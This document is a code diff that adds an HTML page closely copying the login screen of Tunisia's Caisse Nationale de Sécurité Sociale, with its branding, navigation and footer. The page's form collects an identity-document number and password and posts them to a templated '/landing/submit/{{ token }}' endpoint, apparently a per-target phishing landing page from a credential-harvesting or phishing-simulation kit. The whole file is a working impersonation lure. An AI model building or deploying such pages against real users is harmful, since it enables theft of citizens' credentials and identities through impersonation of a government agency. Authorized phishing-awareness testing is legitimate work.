@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CNSS - Espace Assuré</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background: #d9d9d9;
+            color: #333;
+            font-size: 14px;
+        }
+        .container {
+            max-width: 1500px;
+            margin: 0 auto;
+            background: #fff;
+            min-height: 100vh;
+        }
+        /* Top header */
+        .top-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            padding: 14px 24px 0;
+        }
+        .brand .republique {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 15px;
+            color: #444;
+            margin-bottom: 3px;
+        }
+        .flag {
+            width: 24px;
+            height: 16px;
+            background: #e70013;
+            border-radius: 2px;
+            position: relative;
+            display: inline-block;
+        }
+        .flag::after {
+            content: "";
+            position: absolute;
+            width: 9px; height: 9px;
+            background: #e70013;
+            border-radius: 50%;
+            border: 2px solid #fff;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        .cnss-name {
+            font-weight: bold;
+            color: #1a7a3c;
+            font-size: 16px;
+        }
+        .top-right {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            gap: 8px;
+        }
+        .top-links {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            font-size: 13px;
+            color: #555;
+        }
+        .top-links a { color: #1a7a3c; text-decoration: none; }
+        .top-links .sep { color: #ccc; }
+        .search-box {
+            display: flex;
+            border: 2px solid #1a8a7a;
+            border-radius: 2px;
+            width: 230px;
+        }
+        .search-box input {
+            border: none;
+            flex: 1;
+            padding: 5px 8px;
+            outline: none;
+        }
+        .search-box button {
+            background: #fff;
+            border: none;
+            border-left: 1px solid #1a8a7a;
+            padding: 0 10px;
+            color: #1a8a7a;
+            cursor: pointer;
+            font-size: 15px;
+        }
+        /* Logo row */
+        .logo-row {
+            display: flex;
+            align-items: center;
+            padding: 0 24px;
+            min-height: 150px;
+        }
+        .logo-img {
+            width: 200px;
+            text-align: center;
+        }
+        .logo-img svg { width: 170px; height: 130px; }
+        .flash-notice {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-left: 60px;
+            color: #888;
+            font-size: 17px;
+        }
+        .puzzle {
+            width: 55px; height: 50px;
+            fill: #d2d2d2;
+        }
+        /* Nav bar */
+        .nav {
+            display: flex;
+            border-bottom: 3px solid #1a8a7a;
+            padding: 0 24px;
+            align-items: flex-end;
+        }
+        .nav-item {
+            padding: 13px 30px;
+            font-size: 15px;
+            color: #333;
+            cursor: pointer;
+        }
+        .nav-item.active {
+            background: #2a9d8c;
+            background: linear-gradient(#3aa897, #1a8a7a);
+            color: #fff;
+            font-weight: bold;
+            border-radius: 8px 8px 0 0;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+        /* Body area */
+        .body-area {
+            background: linear-gradient(#ffffff, #eef0ef);
+            min-height: 500px;
+            padding-bottom: 40px;
+        }
+        /* Session tab - the folder shape */
+        .session-tab {
+            position: relative;
+            display: inline-block;
+            margin: 22px 0 0 28px;
+        }
+        .session-tab .tab-main {
+            background: #1a8a7a;
+            color: #fff;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 11px 80px 11px 22px;
+            border-radius: 4px 14px 0 0;
+            position: relative;
+            box-shadow: 2px 2px 3px rgba(0,0,0,0.15);
+        }
+        .session-tab .tab-fold {
+            position: absolute;
+            bottom: -8px;
+            left: 6px;
+            width: 92%;
+            height: 10px;
+            background: #14735f;
+            border-radius: 0 0 6px 6px;
+            z-index: -1;
+        }
+        /* Login form */
+        .login-inner {
+            padding: 50px 20px 30px;
+        }
+        .form-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 22px;
+        }
+        .form-row label {
+            width: 260px;
+            text-align: right;
+            padding-right: 24px;
+            color: #1a7a3c;
+            font-weight: bold;
+            font-size: 15px;
+        }
+        .form-row input {
+            width: 250px;
+            padding: 8px;
+            border: 1px solid #bbb;
+            background: #eef0ef;
+            border-radius: 2px;
+        }
+        .btn-row { text-align: center; margin: 26px 0 18px; }
+        .btn-login {
+            padding: 9px 22px;
+            background: linear-gradient(#fdfdfd, #e4e4e4);
+            border: 1px solid #aaa;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 15px;
+            color: #333;
+        }
+        .btn-login:hover { background: linear-gradient(#e4e4e4, #d4d4d4); }
+        .extra-links {
+            display: flex;
+            justify-content: center;
+            gap: 50px;
+            margin-top: 14px;
+            font-size: 14px;
+        }
+        .extra-links a {
+            color: #555;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .icon-circle {
+            width: 18px; height: 18px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+        .icon-user { color: #5a8db5; font-size: 16px; }
+        .icon-help {
+            background: #5a8db5;
+            color: #fff;
+            text-align: center;
+            line-height: 18px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        /* Footer */
+        .footer {
+            padding: 30px 20px;
+            text-align: center;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 60px;
+            color: #4a8a4a;
+            font-size: 15px;
+            padding-bottom: 18px;
+            border-bottom: 1px solid #ddd;
+            max-width: 800px;
+            margin: 0 auto 14px;
+        }
+        .footer-links a { color: #6a9a6a; text-decoration: none; }
+        .footer-meta {
+            color: #888;
+            font-size: 13px;
+            line-height: 1.7;
+        }
+        .footer-meta .green { color: #4a8a4a; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="top-header">
+            <div class="brand">
+                <div class="republique"><span class="flag"></span> République Tunisienne</div>
+                <div class="cnss-name">Caisse Nationale de Sécurité Sociale</div>
+            </div>
+            <div class="top-right">
+                <div class="top-links">
+                    <a href="#">عربي</a>
+                    <span class="sep">|</span>
+                    <a href="#">English</a>
+                    <span class="sep">|</span>
+                    <span>a-</span>
+                    <span>A+</span>
+                    <a href="#">Rechercher</a>
+                </div>
+                <div class="search-box">
+                    <input type="text">
+                    <button>🔍</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="logo-row">
+            <div class="logo-img">
+                <svg viewBox="0 0 170 130" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M40 110 Q60 70 130 55 Q70 75 60 110 Z" fill="#3a8a1e"/>
+                    <path d="M45 105 Q70 60 140 50 Q80 70 65 105 Z" fill="#7ab51d" opacity="0.85"/>
+                    <circle cx="88" cy="32" r="11" fill="#3a8a1e"/>
+                    <rect x="83" y="42" width="10" height="40" rx="3" fill="#3a8a1e"/>
+                    <rect x="68" y="50" width="40" height="8" rx="4" fill="#3a8a1e"/>
+                    <circle cx="62" cy="78" r="7" fill="#7ab51d"/>
+                    <circle cx="112" cy="74" r="7" fill="#7ab51d"/>
+                    <rect x="58" y="84" width="7" height="22" rx="3" fill="#7ab51d"/>
+                    <rect x="108" y="80" width="7" height="22" rx="3" fill="#7ab51d"/>
+                </svg>
+            </div>
+            <div class="flash-notice">
+                <svg class="puzzle" viewBox="0 0 24 24"><path d="M20.5 11H19V7c0-1.1-.9-2-2-2h-4V3.5C13 2.12 11.88 1 10.5 1S8 2.12 8 3.5V5H4c-1.1 0-1.99.9-1.99 2v3.8H3.5c1.49 0 2.7 1.21 2.7 2.7s-1.21 2.7-2.7 2.7H2V20c0 1.1.9 2 2 2h3.8v-1.5c0-1.49 1.21-2.7 2.7-2.7s2.7 1.21 2.7 2.7V22H17c1.1 0 2-.9 2-2v-4h1.5c1.38 0 2.5-1.12 2.5-2.5S21.88 11 20.5 11z"/></svg>
+                Le plug-in Adobe Flash Player n'est plus compatible
+            </div>
+        </div>
+
+        <div class="nav">
+            <div class="nav-item">Accueil</div>
+            <div class="nav-item">Employeurs</div>
+            <div class="nav-item active">Salariés</div>
+            <div class="nav-item">Indépendants et autres catégories</div>
+        </div>
+
+        <div class="body-area">
+            <div class="session-tab">
+                <div class="tab-main">Ouvrir une session</div>
+                <div class="tab-fold"></div>
+            </div>
+
+            <div class="login-inner">
+                <form method="POST" action="/landing/submit/{{ token }}">
+                    <div class="form-row">
+                        <label>Numéro pièce d'identité :</label>
+                        <input type="text" name="username" required>
+                    </div>
+                    <div class="form-row">
+                        <label>Mot de passe :</label>
+                        <input type="password" name="password" required>
+                    </div>
+                    <div class="btn-row">
+                        <button type="submit" class="btn-login">Ouvrir une session</button>
+                    </div>
+                    <div class="extra-links">
+                        <a href="#"><span class="icon-user">👤</span> Créer un compte</a>
+                        <a href="#"><span class="icon-circle icon-help">?</span> Mot de passe oublié</a>
+                    </div>
+                </form>
+            </div>
+
+            <div class="footer">
+                <div class="footer-links">
+                    <a href="#">Accueil</a>
+                    <a href="#">FAQ</a>
+                    <a href="#">Politique de confidentialité</a>
+                    <a href="#">Plan du site</a>
+                </div>
+                <div class="footer-meta">
+                    Dernière mise à jour effectuée le <span class="green">02/09/2016</span><br>
+                    Ce site est optimisé pour un affichage : 1024x768 avec les navigateurs IE7 / Mozilla Firefox 3 / Google Chrome
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
